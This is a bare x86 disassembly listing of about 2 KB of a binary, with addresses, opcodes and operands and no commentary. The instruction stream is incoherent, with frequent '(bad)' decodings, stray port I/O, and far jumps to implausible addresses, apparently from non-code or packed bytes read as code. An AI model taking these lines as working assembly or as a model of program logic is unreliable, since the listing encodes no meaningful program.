  408bd3:	or     eax,0xff66cf33
  408bd8:	add    eax,0xf841717d
  408bdd:	daa    
  408bde:	lods   al,BYTE PTR ds:[esi]
  408bdf:	adc    DWORD PTR [edi-0x33],ebp
  408be2:	cld    
  408be3:	ins    BYTE PTR es:[edi],dx
  408be4:	xchg   ebx,eax
  408be5:	xor    bh,0x96
  408be8:	mov    dh,0x1a
  408bea:	pop    eax
  408beb:	fwait
  408bec:	sub    DWORD PTR [esi],esi
  408bee:	stos   DWORD PTR es:[edi],eax
  408bef:	mov    esp,0x7f913afb
  408bf4:	jne    0x408c50
  408bf6:	(bad)  
  408bf8:	in     eax,dx
  408bf9:	jb     0x408b86
  408bfb:	neg    DWORD PTR [esi+0x34]
  408bfe:	cmp    eax,0x436c2259
  408c03:	inc    esi
  408c04:	add    BYTE PTR [ebx],0x77
  408c07:	mov    al,0x2b
  408c09:	cld    
  408c0a:	out    dx,eax
  408c0b:	lahf   
  408c0c:	pushf  
  408c0d:	push   ebx
  408c0e:	mov    edx,esp
  408c10:	out    0xbc,al
  408c12:	pushf  
  408c13:	mov    ebx,0x5f4075dc
  408c18:	mov    eax,0x5bb9956b
  408c1d:	xchg   ecx,eax
  408c1e:	push   0xffffffea
  408c20:	mov    bl,0x1
  408c22:	mov    esp,0xef553872
  408c27:	test   BYTE PTR [eax+eiz*1-0x4c],cl
  408c2b:	mov    esi,0x7160f722
  408c30:	cmp    al,0x23
  408c32:	sbb    al,BYTE PTR [ebx+ecx*1]
  408c35:	je     0x408be4
  408c37:	fwait
  408c38:	xchg   esi,eax
  408c39:	call   0x6cd000db
  408c3e:	push   ss
  408c3f:	or     al,0xf7
  408c41:	(bad)  [edx+0x762cc105]
  408c47:	(bad)  
  408c48:	mov    dh,0xa1
  408c4a:	stos   DWORD PTR es:[edi],eax
  408c4b:	sub    esp,edi
  408c4d:	test   BYTE PTR [edx+0x6a192046],cl
  408c53:	xor    eax,0xcea6283f
  408c58:	jp     0x408c7d
  408c5a:	in     eax,dx
  408c5b:	(bad)  
  408c5c:	pop    edx
  408c5d:	adc    BYTE PTR [edi],bl
  408c5f:	imul   eax,DWORD PTR [ebp-0x2f],0xad873824
  408c66:	or     ebp,edx
  408c68:	js     0x408c31
  408c6a:	icebp  
  408c6b:	ret    0xbc34
  408c6e:	or     edi,DWORD PTR [ecx+0x8]
  408c71:	adc    al,0x76
  408c73:	not    BYTE PTR [edi]
  408c75:	xchg   ecx,eax
  408c76:	fldcw  WORD PTR ds:0x7e6c5951
  408c7c:	mov    ds:0x55f7ae0a,al
  408c81:	jbe    0x408c51
  408c83:	aad    0x20
  408c85:	adc    DWORD PTR [esi-0x6238dcd1],edi
  408c8b:	jne    0x408c3c
  408c8d:	mov    ds:0x8ed2d85a,al
  408c92:	mov    ecx,0xec804c09
  408c97:	dec    esp
  408c98:	inc    ebx
  408c99:	inc    ebp
  408c9a:	xchg   esp,eax
  408c9b:	out    dx,eax
  408c9c:	jne    0x408c97
  408c9e:	mov    eax,0xf7d9d9a8
  408ca3:	in     al,dx
  408ca4:	and    eax,0xb516bab7
  408ca9:	mov    ds:0x62214d45,al
  408cae:	mov    esi,0xc8186afe
  408cb3:	cmp    BYTE PTR [eax+0xa],al
  408cb6:	jge    0x408ce2
  408cb8:	cmp    dl,BYTE PTR [edi]
  408cba:	lahf   
  408cbb:	inc    esp
  408cbc:	xchg   dh,ah
  408cbe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cbf:	cmp    bl,dh
  408cc1:	aad    0x3a
  408cc3:	mov    ds:0x4b51caac,al
  408cc8:	fstp   DWORD PTR [ebx-0x40dc38ae]
  408cce:	(bad)  [ecx+0x753af412]
  408cd4:	rol    al,cl
  408cd6:	sbb    al,0xc4
  408cd8:	pop    ebp
  408cd9:	pop    ds
  408cda:	push   ecx
  408cdb:	arpl   WORD PTR [ecx+0x50],ax
  408cde:	push   edi
  408cdf:	jne    0x408cd8
  408ce1:	sub    edx,DWORD PTR [ebx]
  408ce3:	push   eax
  408ce4:	push   esp
  408ce5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408ce6:	xchg   ecx,eax
  408ce7:	xor    al,0xc4
  408ce9:	jp     0x408d1f
  408ceb:	jl     0x408d02
  408ced:	sbb    edx,DWORD PTR [ecx+0x15]
  408cf0:	ins    BYTE PTR es:[edi],dx
  408cf1:	adc    DWORD PTR [eax-0x58],esi
  408cf4:	aaa    
  408cf5:	pop    ds
  408cf6:	call   0x5a3:0x46af8c37
  408cfd:	mov    BYTE PTR [esi],bl
  408cff:	add    DWORD PTR [eax+0x1d],esi
  408d02:	repnz push esp
  408d04:	push   esi
  408d05:	cs jo  0x408cf4
  408d08:	call   0xdc37a5d6
  408d0d:	ss rol ch,1
  408d10:	add    esp,DWORD PTR [edx-0x16]
  408d13:	(bad)  
  408d14:	mov    ds:0x25a4be7b,al
  408d19:	xor    al,0x34
  408d1c:	dec    ebp
  408d1d:	jmp    0x7f7501c6
  408d22:	(bad)  
  408d23:	mov    eax,ds:0xf0e504e0
  408d28:	jne    0x408d5f
  408d2a:	adc    DWORD PTR [eax-0x17],0xfffffffa
  408d2e:	jg     0x408d00
  408d30:	out    0x3e,eax
  408d32:	ficom  DWORD PTR [edi+0xb17b6e]
  408d38:	jbe    0x408ced
  408d3a:	(bad)  
  408d3b:	into   
  408d3c:	cmp    edx,DWORD PTR [eax-0x433c0ec8]
  408d42:	loopne 0x408d36
  408d44:	aaa    
  408d45:	jae    0x408d43
  408d47:	in     eax,0xed
  408d49:	ret    
  408d4a:	mov    es,ecx
  408d4c:	mov    ecx,0xbb9f4e42
  408d51:	mov    ds:0xde4f7365,al
  408d56:	mov    eax,0x8ce67756
  408d5b:	push   edx
  408d5c:	xor    BYTE PTR [ebp-0x41fae17d],ah
  408d62:	pushf  
  408d63:	xlat   BYTE PTR ds:[ebx]
  408d64:	mov    esi,0x52afc3ae
  408d69:	push   cs
  408d6a:	fistp  WORD PTR [edx]
  408d6c:	mov    esp,0x4b616ee9
  408d71:	sti    
  408d72:	in     al,dx
  408d73:	sub    BYTE PTR [edi-0x5b828f3a],dh
  408d79:	scas   eax,DWORD PTR es:[edi]
  408d7a:	lahf   
  408d7b:	pop    ebx
  408d7c:	xor    DWORD PTR [esp+edi*1-0x606a259e],ecx
  408d83:	inc    edi
  408d84:	jbe    0x408dc4
  408d86:	inc    ebx
  408d87:	xchg   esp,eax
  408d88:	pop    esi
  408d89:	ret    
  408d8a:	leave  
  408d8b:	cwde   
  408d8c:	jmp    0xe56d8566
  408d91:	ins    BYTE PTR es:[edi],dx
  408d92:	mov    al,0x72
  408d94:	addr16 cli 
  408d96:	or     al,0x18
  408d98:	shl    dl,0xcc
  408d9b:	or     esi,esi
  408d9d:	lods   eax,DWORD PTR ds:[esi]
  408d9e:	dec    eax
  408d9f:	push   ss
  408da0:	push   0x80c5f325
  408da5:	dec    ebx
  408da6:	pushf  
  408da7:	out    0xe1,eax
  408da9:	sbb    al,BYTE PTR [edi-0x6f]
  408dac:	inc    edx
  408dad:	cs cld 
  408daf:	push   0xffffffec
  408db1:	out    0x6c,eax
  408db3:	lods   eax,DWORD PTR ds:[esi]
  408db4:	rcl    BYTE PTR [ecx+0x2875fc1c],1
  408dba:	dec    esp
  408dbb:	push   esp
  408dbc:	dec    edi
  408dbd:	dec    eax
  408dbe:	mov    BYTE PTR [ebp+0x10],ah
  408dc1:	test   eax,0x34e23810
  408dc6:	outs   dx,DWORD PTR ds:[esi]
  408dc7:	imul   esi,esp,0xffffffa6
  408dca:	sti    
  408dcb:	popf   
  408dcc:	mov    edi,0x3c81dfdd
  408dd1:	mov    ch,0x82
  408dd3:	push   ds
  408dd4:	in     al,dx
  408dd5:	(bad)  
  408dd6:	call   0xea98df7f
  408ddb:	mov    ah,0xda
  408ddd:	jg     0x408d87
  408ddf:	outs   dx,DWORD PTR ds:[esi]
  408de0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408de1:	or     DWORD PTR [ebp-0x76bbb7fd],edx
  408de7:	sbb    ecx,DWORD PTR [ebx+0x75]
  408dea:	mov    ds:0xc1e1f076,al
  408def:	or     DWORD PTR [ebx],edi
  408df1:	mov    al,0xdf
  408df3:	fld    DWORD PTR [eax+0x7ba0ef28]
  408df9:	push   esi
  408dfa:	push   cs
  408dfb:	out    0x45,eax
  408dfd:	loop   0x408e4d
  408dff:	retf   
  408e00:	jne    0x408dec
  408e02:	xchg   esi,eax
  408e03:	fisub  WORD PTR [ebx+edx*2+0x5b]
  408e07:	cwde   
  408e08:	stos   BYTE PTR es:[edi],al
  408e09:	sbb    cx,bp
  408e0c:	scas   eax,DWORD PTR es:[edi]
  408e0d:	mov    al,0x70
  408e0f:	pop    esp
  408e10:	jns    0x408db2
  408e12:	aad    0x4a
  408e14:	mov    eax,DWORD PTR [esi]
  408e16:	and    al,0x2
  408e18:	loope  0x408e8c
  408e1a:	(bad)  
  408e1c:	dec    esp
  408e1d:	jne    0x408de9
  408e1f:	leave  
  408e20:	add    DWORD PTR [ecx+0xed44ce9],0xc5a6651
  408e2a:	sbb    eax,0xad82e575
  408e2f:	sbb    eax,0xb2a9eadd
  408e34:	or     al,0xe9
  408e36:	add    BYTE PTR [eax+0x70],0x96
  408e3a:	xchg   ebp,eax
  408e3b:	mov    dh,0xf8
  408e3d:	das    
  408e3e:	ds add al,0xfa
  408e41:	jnp    0x408e45
  408e43:	lods   al,BYTE PTR ds:[esi]
  408e44:	sbb    ch,0x73
  408e47:	adc    BYTE PTR [ecx],0x24
  408e4a:	mov    esi,0x4594676a
  408e4f:	dec    esi
  408e50:	or     dl,BYTE PTR [ebp-0x1e]
  408e53:	sub    DWORD PTR ds:0x4c1f58e2,eax
  408e59:	fwait
  408e5a:	(bad)
  408e5e:	or     eax,0x800aacb
  408e63:	inc    edx
  408e64:	lods   al,BYTE PTR ds:[esi]
  408e65:	(bad)  
  408e67:	loopne 0x408e8d
  408e69:	mov    cl,dh
  408e6b:	xchg   ebx,eax
  408e6c:	hlt    
  408e6d:	test   eax,0xab748dbd
  408e72:	and    bl,dl
  408e74:	jnp    0x408e2b
  408e76:	mov    esi,0xec1e8831
  408e7b:	adc    DWORD PTR [esi-0x49e73712],ebx
  408e81:	out    dx,al
  408e82:	out    0x6e,al
  408e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408e85:	call   0xa891:0xf5872225
  408e8c:	add    BYTE PTR [esi+eax*1-0x11b480d5],0x62
  408e94:	push   esi
  408e95:	pop    ebx
  408e96:	jmp    0xd141:0xdd682364
  408e9d:	mov    ch,0x20
  408e9f:	fisubr WORD PTR [ecx]
  408ea1:	lods   eax,DWORD PTR ds:[esi]
  408ea2:	stc    
  408ea3:	and    esp,ebx
  408ea5:	inc    eax
  408ea6:	pop    DWORD PTR [eax]
  408ea8:	out    dx,al
  408ea9:	add    ah,cl
  408eab:	scas   al,BYTE PTR es:[edi]
  408eac:	in     eax,dx
  408ead:	in     al,0xaa
  408eaf:	cmp    BYTE PTR [ebp+0x2c0d9fee],0x35
  408eb6:	jne    0x408e49
  408eb8:	xchg   bl,bl
  408eba:	dec    eax
  408ebb:	push   cs
  408ebc:	cmp    BYTE PTR [edx-0x6c446da4],al
  408ec2:	add    BYTE PTR [edi+0x5a20b47d],bl
  408ec8:	xor    DWORD PTR [ebx+edi*1-0x68],0x51afa022
  408ed0:	sahf   
  408ed1:	sub    ch,BYTE PTR [eax]
  408ed3:	or     esi,DWORD PTR [edx+0xab7d780]
  408ed9:	jo     0x408e83
  408edb:	dec    ebx
  408edc:	sub    DWORD PTR [eax+0x17],edi
  408edf:	inc    ebp
  408ee0:	bound  edx,QWORD PTR [edx]
  408ee2:	jmp    0xa3ff:0x2cd5d8b1
  408ee9:	xor    eax,0x84917449
  408eee:	cmp    al,0xee
  408ef0:	jmp    0x9781cc78
  408ef5:	pop    edi
  408ef6:	repnz cmp BYTE PTR [esi+0x2c],cl
  408efa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408efb:	pusha  
  408efc:	xlat   BYTE PTR ds:[ebx]
  408efd:	std    
  408efe:	dec    eax
  408eff:	xor    DWORD PTR es:[ebx-0x16fdeef],0xeeaabf48
  408f0a:	sub    al,0xba
  408f0c:	adc    esp,DWORD PTR [ecx+0x3ae9c918]
  408f12:	mov    eax,ds:0xa646c4b2
  408f17:	xchg   edx,eax
  408f18:	ins    DWORD PTR es:[edi],dx
  408f19:	push   0xffffffa4
  408f1b:	jmp    0xd531:0xaa01d944
  408f22:	cmp    BYTE PTR [edi],0x38
  408f25:	pop    ebx
  408f26:	add    edx,DWORD PTR [ebp-0x3ba74f20]
  408f2c:	dec    ecx
  408f2d:	out    0x7,eax
  408f2f:	inc    ebp
  408f30:	add    al,0x26
  408f32:	add    ah,dh
  408f34:	sbb    ah,dl
  408f36:	pop    ecx
  408f37:	inc    DWORD PTR [ecx+0x33]
  408f3a:	in     eax,0x3
  408f3c:	imul   esp,DWORD PTR ds:0xf570318a,0xffffffb5
  408f43:	fild   DWORD PTR [esi+0x2565ba8b]
  408f49:	jmp    0x408f2b
  408f4b:	xor    BYTE PTR [ecx+0x39],dh
  408f4e:	gs push ebp
  408f50:	scas   al,BYTE PTR es:[edi]
  408f51:	mov    al,ds:0x8a6fb34e
  408f56:	ror    BYTE PTR [edi],1
  408f58:	sbb    ch,BYTE PTR [edx]
  408f5a:	outs   dx,BYTE PTR ds:[esi]
  408f5b:	jmp    0x408ee8
  408f5d:	jecxz  0x408eee
  408f5f:	aaa    
  408f60:	pop    ecx
  408f61:	pop    esp
  408f62:	inc    esi
  408f63:	mov    edx,0x8060fe1a
  408f68:	sub    edi,DWORD PTR [edi-0x34]
  408f6b:	xor    al,0xa6
  408f6d:	add    al,0xc0
  408f6f:	stos   DWORD PTR es:[edi],eax
  408f70:	push   ecx
  408f71:	xchg   ebp,eax
  408f72:	icebp  
  408f73:	pop    ss
  408f74:	cmp    al,0x5
  408f76:	add    BYTE PTR [edx+0x463fa0ea],dh
  408f7c:	xor    eax,0x2a96f828
  408f81:	xchg   esp,eax
  408f82:	add    ah,BYTE PTR [eax-0xb]
  408f85:	mov    eax,0xd1518e7c
  408f8a:	aas    
  408f8b:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f8d:	xor    DWORD PTR [esi+0x17cd736f],0xffffffe6
  408f94:	mov    esi,0x4ff07189
  408f99:	js     0x408f7c
  408f9b:	inc    eax
  408f9c:	pop    edi
  408f9d:	les    ebp,FWORD PTR [eax-0x2d9f9527]
  408fa3:	push   edx
  408fa4:	xor    eax,0xf3c1aa75
  408fa9:	sub    esp,DWORD PTR [ecx+0x43ba3392]
  408faf:	adc    DWORD PTR [ecx],ebx
  408fb1:	cwde   
  408fb2:	(bad)  
  408fb3:	and    al,0x26
  408fb5:	inc    edx
  408fb6:	shr    BYTE PTR ds:0x4eb23865,0x79
  408fbd:	adc    al,0x47
  408fbf:	cs mov dh,0xab
  408fc2:	or     ch,0x16
  408fc5:	jl     0x40903b
  408fc7:	pop    ebx
  408fc8:	xchg   ebx,eax
  408fc9:	xlat   BYTE PTR ds:[ebx]
  408fca:	cdq    
  408fcb:	mov    eax,0x73fe018c
  408fd0:	(bad)  
  408fd1:	addr16 cld 
  408fd3:	adc    al,0xb6
  408fd5:	inc    esi
  408fd6:	into   
  408fd7:	retf   
  408fd8:	or     eax,0xf1bdf9c2
  408fdd:	retf   
  408fde:	ins    BYTE PTR es:[edi],dx
  408fdf:	in     eax,0xcf
  408fe1:	mov    ds:0x659655df,eax
  408fe6:	lods   al,BYTE PTR ds:[esi]
  408fe7:	add    DWORD PTR [ebp+0x12],0x35
  408feb:	mov    edi,0x815ffcfd
  408ff0:	test   DWORD PTR [edx+0x662de079],0x992ce725
  408ffa:	clc    
  408ffb:	jge    0x40903b
  408ffd:	cdq    
  408ffe:	push   cs
  408fff:	push   esi
  409000:	sti    
  409001:	in     al,0x7b
  409003:	mov    eax,ds:0xfe6a1422
  409008:	jmp    0x1b7c7e81
  40900d:	adc    al,0x6f
  40900f:	mov    dl,0x68
  409011:	aas    
  409012:	pop    ds
  409013:	jl     0x408fa8
  409015:	add    al,0xa
  409017:	retf   0x1ef7
  40901a:	add    al,0xd2
  40901c:	les    esi,FWORD PTR [edi]
  40901e:	mov    bh,0xd3
  409020:	and    BYTE PTR [eax],bh
  409022:	ins    BYTE PTR es:[edi],dx
  409023:	or     cl,BYTE PTR [ecx]
  409025:	or     BYTE PTR [ebx],dh
  409027:	test   al,0x7e
  409029:	imul   esp,DWORD PTR [esi-0x497b0fe4],0xf449c9ad
  409033:	jmp    0x40909a
  409035:	dec    ebx
  409036:	jo     0x40905d
  409038:	sbb    dh,BYTE PTR [eax]
  40903a:	or     bh,BYTE PTR [edx+edi*4]
  40903d:	retf   0xef03
  409040:	pop    ebp
  409041:	cmp    al,0xb7
  409043:	nop
  409044:	popa   
  409045:	addr16 adc al,dl
  409048:	push   ecx
  409049:	aas    
  40904a:	cmp    BYTE PTR [eax+0x3b],ch
  40904d:	mov    ah,0x59
  40904f:	mov    esp,0x63dfcf36
  409054:	sbb    DWORD PTR ds:0x6e1b40c8,esp
  40905a:	add    BYTE PTR [esi-0x458f3c08],dh
  409060:	jmp    0xfa10:0xbed976cc
  409067:	das    
  409068:	test   DWORD PTR [ecx-0x32],ebx
  40906b:	sbb    cl,BYTE PTR [ebp*1+0x1912f698]
  409072:	adc    BYTE PTR ds:0x911b24a,cl
  409078:	aaa    
  409079:	jb     0x40909f
  40907b:	shr    DWORD PTR [ecx],0xc0
  40907e:	aas    
  40907f:	or     BYTE PTR [ecx],ch
  409081:	sub    al,ch
  409083:	push   ecx
  409084:	(bad)  
  409085:	sub    eax,0x66eedf13
  40908a:	xchg   edx,eax
  40908b:	push   ebp
  40908c:	jle    0x40901a
  40908e:	cmc    
  40908f:	add    BYTE PTR [esp+edi*4+0x2a529d3e],0x5d
  409097:	mov    esi,0xa3c48e99
  40909c:	sub    cl,BYTE PTR [eax-0x24e1a2ff]
  4090a2:	iret   
  4090a3:	fucomip st,st(2)
  4090a5:	pop    edi
  4090a6:	adc    esp,DWORD PTR [edi]
  4090a8:	popf   
  4090a9:	adc    ah,ah
  4090ab:	loop   0x40910f
  4090ad:	cli    
  4090ae:	ret    
  4090af:	test   al,0x5b
  4090b1:	xor    al,0x17
  4090b3:	mov    esp,0x4a4a8f68
  4090b8:	and    eax,0x5a049b95
  4090bd:	aaa    
  4090be:	sti    
  4090bf:	xor    eax,DWORD PTR [esi+0x6e]
  4090c2:	std    
  4090c3:	mov    bl,0x1a
  4090c5:	inc    ebp
  4090c6:	sub    dh,BYTE PTR fs:[esi-0x3dc94503]
  4090cd:	ins    DWORD PTR es:[edi],dx
  4090ce:	sbb    al,0x92
  4090d0:	jg     0x40909a
  4090d2:	fdiv   DWORD PTR [ecx-0x1a]
  4090d5:	add    eax,0xcf9aeaaa
  4090da:	fwait
  4090db:	outs   dx,DWORD PTR ds:[esi]
  4090dc:	inc    ebx
  4090dd:	pop    esp
  4090de:	push   ds
  4090df:	enter  0x6220,0x87
  4090e3:	add    bh,dh
  4090e5:	push   0x19
  4090e7:	push   edx
  4090e8:	mov    dh,0x5c
  4090ea:	push   esi
  4090eb:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4090ed:	push   es
  4090ee:	arpl   cx,dx
  4090f0:	adc    al,0x98
  4090f2:	(bad)  
  4090f4:	mov    esp,0xa62f1145
  4090f9:	neg    esp
  4090fb:	mov    ah,0x16
  4090fd:	mov    dl,0x16
  4090ff:	in     al,0x7e
  409101:	xor    ch,BYTE PTR [edx+0x6794f1fe]
  409107:	repz xchg edx,eax
  409109:	xchg   ebp,eax
  40910a:	dec    esp
  40910b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40910c:	pop    ebx
  40910d:	call   0xd999:0xb4d060b7
  409114:	shl    BYTE PTR ds:0x3d01abe7,1
  40911a:	fst    QWORD PTR [edi+edx*2]
  40911d:	out    dx,al
  40911e:	shl    DWORD PTR [edi+0x39],cl
  409121:	ss mov ah,bl
  409124:	scas   eax,DWORD PTR es:[edi]
  409125:	arpl   WORD PTR [ebx],di
  409127:	and    edi,esi
  409129:	cmp    al,0xcc
  40912b:	pop    ebp
  40912c:	mov    eax,ds:0x364d489f
  409131:	(bad)  
  409132:	pop    ebx
  409133:	repnz xchg ebx,eax
  409135:	sahf   
  409136:	cmc    
  409137:	inc    esp
  409138:	mov    esp,0x5b27a79d
  40913d:	push   ebp
  40913e:	hlt    
  40913f:	jns    0x4090cf
  409141:	mov    eax,?
  409143:	jbe    0x40915f
  409145:	test   eax,0xe3b820b5
  40914a:	je     0x40913a
  40914c:	fld    st(3)
  40914e:	repz jne 0x409196
  409151:	cwde   
  409152:	jne    0x4090eb
  409154:	push   ebx
  409155:	jnp    0x4091ca
  409157:	rol    BYTE PTR [ebx],0xf3
  40915a:	adc    BYTE PTR [ebx],dh
  40915c:	adc    al,0xb
  40915e:	sub    edx,ecx
  409160:	enter  0x46e,0xb8
  409164:	mov    edx,DWORD PTR [esi+0x66]
  409167:	ins    DWORD PTR es:[edi],dx
  409168:	push   0xffffffd2
  40916a:	sbb    dh,BYTE PTR [ecx]
  40916c:	sbb    eax,0x6f862821
  409171:	mov    ch,0x30
  409173:	in     al,0xb8
  409175:	push   ebp
  409176:	ja     0x409185
  409178:	pop    esi
  409179:	mov    dl,0xfb
  40917b:	popf   
  40917c:	mov    edx,0x8c1b2231
  409181:	sub    cl,0x74
  409184:	(bad)  
  409185:	dec    ecx
  409186:	hlt    
  409187:	mov    ds:0x549ed59e,al
  40918c:	push   edx
  40918d:	jl     0x40912a
  40918f:	inc    ecx
  409190:	or     DWORD PTR [esi],edx
  409192:	test   dh,bl
  409194:	sub    bh,BYTE PTR [esi+0x71]
  409197:	mov    ah,0xec
  409199:	dec    esp
  40919a:	fmul   DWORD PTR ds:0x35085555
  4091a0:	(bad)  
  4091a1:	ss int3 
  4091a3:	ins    BYTE PTR es:[edi],dx
  4091a4:	dec    ebp
  4091a5:	jne    0x409200
  4091a7:	add    ah,bl
  4091a9:	mov    dl,0x49
  4091ab:	popa   
  4091ac:	sub    dh,BYTE PTR [ebx+ebp*4]
  4091af:	(bad)  
  4091b0:	mov    dh,BYTE PTR [ecx+eiz*2-0x13]
  4091b4:	(bad)  
  4091b5:	addr16 add eax,edx
  4091b8:	push   ebx
  4091b9:	or     esp,edx
  4091bb:	dec    eax
  4091bc:	jbe    0x4091e9
  4091be:	(bad)  
  4091bf:	(bad)  
  4091c0:	fidivr DWORD PTR [esi+0x63296038]
  4091c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091c7:	add    DWORD PTR [eax-0x40],edx
  4091ca:	in     eax,0x38
  4091cc:	jle    0x4091bc
  4091ce:	mov    edx,0x7d081a52
  4091d3:	add    DWORD PTR [edx+0x1f0f8d0c],ebp
  4091d9:	sub    eax,0x64d05951
  4091de:	fs jmp 0x40923a
  4091e1:	clc    
  4091e2:	imul   eax,DWORD PTR [edx+edx*8],0x6f
  4091e6:	dec    edi
  4091e7:	outs   dx,DWORD PTR ds:[esi]
  4091e8:	int3   
  4091e9:	pusha  
  4091ea:	mov    eax,0xee177b49
  4091ef:	popf   
  4091f0:	leave  
  4091f1:	push   esi
  4091f2:	pop    esi
  4091f3:	lahf   
  4091f4:	and    DWORD PTR [ecx-0x76fe1488],eax
  4091fa:	add    al,0xe9
  4091fc:	data16 sub dl,dl
  4091ff:	repz add al,0xa7
  409202:	or     DWORD PTR [edx+0x35e47b27],0x65
  409209:	fs mov ah,0x20
  40920c:	mov    DWORD PTR [edx],esp
  40920e:	iret   
  40920f:	push   edx
  409210:	xor    esi,0x25
  409213:	sahf   
  409214:	int    0xce
  409216:	stos   DWORD PTR es:[edi],eax
  409217:	addr16 xchg edi,eax
  409219:	sti    
  40921a:	ret    0x8458
  40921d:	mov    ecx,DWORD PTR [esi+0x3ea35325]
  409223:	fidiv  WORD PTR [ecx+0x2ecba261]
  409229:	xchg   edx,eax
  40922a:	and    bh,ch
  40922c:	shl    DWORD PTR [edi+0x6c],cl
  40922f:	xor    eax,0xbd888b19
  409234:	xor    edi,DWORD PTR [esi-0x16096847]
  40923a:	inc    eax
  40923b:	hlt    
  40923c:	jmp    0x1139:0x94de352f
  409243:	mov    ch,0xdb
  409245:	out    0x4b,eax
  409247:	mov    edi,0x4b0fcc58
  40924c:	je     0x4092ca
  40924e:	xchg   ecx,eax
  40924f:	inc    ebp
  409250:	mov    bl,0x3c
  409252:	ret    0xd4f9
  409255:	in     al,0x74
  409257:	(bad)
  40925a:	retf   0x8d26
  40925d:	mov    al,ds:0xba0cba82
  409262:	push   esi
  409263:	mov    eax,0xcf113ef
  409268:	ins    DWORD PTR es:[edi],dx
  409269:	ja     0x4092c3
  40926b:	out    0x68,al
  40926d:	push   edi
  40926e:	sbb    eax,0xfc9d8341
  409273:	cwde   
  409274:	mov    cl,0xea
  409276:	pushf  
  409277:	cmpps  xmm1,XMMWORD PTR [esi+0x59d77f1f],0xbc
  40927f:	push   cs
  409280:	(bad)  
  409281:	fist   DWORD PTR [eax-0x2d30b9ca]
  409287:	xlat   BYTE PTR ds:[ebx]
  409288:	add    eax,0x156c6b60
  40928d:	cs jb  0x4092cd
  409290:	sbb    ah,BYTE PTR [eax+edi*1]
  409293:	out    dx,eax
  409294:	fld1   
  409296:	hlt    
  409297:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409298:	jnp    0x409226
  40929a:	les    ebp,FWORD PTR [eax-0x13]
  40929d:	sbb    DWORD PTR [edx-0x8],ebp
  4092a0:	xchg   DWORD PTR [ebx+0x1e],eax
  4092a3:	pop    eax
  4092a4:	or     BYTE PTR [eax],cl
  4092a6:	shr    DWORD PTR [ebx-0x52f10011],1
  4092ac:	lahf   
  4092ad:	and    eax,0x61652c6
  4092b2:	fmul   DWORD PTR [edi+0x72]
  4092b5:	fcomp  DWORD PTR [ecx]
  4092b7:	xor    DWORD PTR [esi+ebx*2-0x3d33dc6c],eax
  4092be:	mov    ecx,0xf3364f62
  4092c3:	jg     0x4092d7
  4092c5:	dec    edi
  4092c6:	dec    edi
  4092c7:	jp     0x409296
  4092c9:	pop    esi
  4092ca:	(bad)  
  4092cb:	mov    BYTE PTR [edx+esi*2+0x29],bh
  4092cf:	push   ebx
  4092d0:	pop    ss
  4092d1:	aaa    
  4092d2:	mov    eax,gs:0x33dde0c5
  4092d8:	push   edx
  4092d9:	in     al,0x92
  4092db:	mov    ebp,DWORD PTR [edi+0x79]
  4092de:	or     DWORD PTR [eax+0x20],ebp
  4092e1:	mov    cl,0x49
  4092e3:	adc    al,dh
  4092e5:	and    eax,0xdd72ba
  4092ea:	repz mov ebp,0xa64ceb28
  4092f0:	xor    BYTE PTR [ebx],ah
  4092f2:	inc    esi
  4092f3:	jge    0x409311
  4092f5:	mov    edx,0x64612ba7
  4092fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092fb:	mov    ebx,0x1c8a71c4
  409300:	mov    DWORD PTR ds:0x831e41d0,edi
  409306:	sar    BYTE PTR [edx],cl
  409308:	and    BYTE PTR [edx],bl
  40930a:	(bad)  
  40930b:	push   0x6e3f3e9f
  409310:	mov    bh,0x4a
  409312:	sar    BYTE PTR [edi],cl
  409314:	sbb    ebx,DWORD PTR [esi+0x54578ff8]
  40931a:	mov    WORD PTR ds:0xcfed54de,?
  409320:	sbb    bl,BYTE PTR [eax-0x43e1aac8]
  409326:	xlat   BYTE PTR ds:[ebx]
  409327:	sub    bl,BYTE PTR [edx]
  409329:	xor    dl,BYTE PTR [eax+0x4d926ec0]
  40932f:	add    bh,BYTE PTR [edi-0x44]
  409332:	scas   eax,DWORD PTR es:[edi]
  409333:	fld    QWORD PTR [esi+eiz*2+0x659c0868]
  40933a:	mov    ch,0x58
  40933c:	ins    DWORD PTR es:[edi],dx
  40933d:	pop    edi
  40933e:	and    eax,0x8aa59c1c
  409343:	push   ecx
  409344:	cmp    BYTE PTR [ebx+0xb577dff],ah
  40934a:	pop    ebx
  40934b:	addr16 mov ss,esp
  40934e:	mov    esp,0xb7970514
  409353:	xor    edx,DWORD PTR [ebp+0x565d8dbb]
  409359:	rol    DWORD PTR [edi-0x6a288cf8],cl
  40935f:	fnstsw WORD PTR [ecx]
  409361:	jbe    0x409317
  409363:	jne    0x409334
  409365:	aad    0x98
  409367:	xor    DWORD PTR [ebx-0x47],0x69
  40936b:	pop    ecx
  40936c:	mov    esi,0x5e3ffb34
  409371:	icebp  
  409372:	retf   0x16d7
  409375:	dec    ebp
  409376:	scas   eax,DWORD PTR es:[edi]
  409377:	cmp    esi,0x3d
  40937a:	ficomp DWORD PTR [esi-0x9]
  40937d:	jns    0x409355
  40937f:	and    bl,bh
  409381:	nop
  409382:	pushf  
  409383:	in     al,0x17
  409385:	repnz xchg ebx,eax
  409387:	stc    
  409388:	mov    ebx,eax
  40938a:	mov    BYTE PTR [esi+0x7d],cl
  40938d:	or     al,0x93
  40938f:	repnz cmp al,0xa8
  409392:	out    0xf7,eax
  409394:	pushf  
  409395:	push   ebx
  409396:	bound  eax,QWORD PTR ds:0x898d9def
  40939c:	jp     0x4093e1
  40939e:	jge    0x409385
  4093a0:	pop    ss
  4093a1:	pop    esp
  4093a2:	cmp    al,0xfb
  4093a4:	push   cs
  4093a5:	outs   dx,BYTE PTR ds:[esi]
  4093a6:	ret    
  4093a7:	cdq    
  4093a8:	ret    0xd4ef
  4093ab:	mov    ch,0x32
  4093ad:	add    al,0x30
  4093af:	mov    bl,0x9a
